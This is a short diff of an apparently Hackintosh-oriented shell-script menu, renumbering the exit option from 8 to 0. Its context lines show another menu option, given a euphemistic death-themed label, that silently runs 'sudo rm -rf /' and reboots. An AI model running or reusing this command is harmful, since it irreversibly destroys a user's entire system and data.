@@ -135,7 +135,7 @@ menu(){
 	echo ""
     echo "7、送黑果归西"
     echo ""
-	echo "8、退出"
+	echo "0、退出"
 	echo ""
 }
 
@@ -175,7 +175,7 @@ Select(){
         sudo rm -rf / >/dev/null 2>&1
         sudo reboot
         ;;
-	8) exit 0
+	0) exit 0
        ;;
     *) echo "输入错误";
 	   echo ""
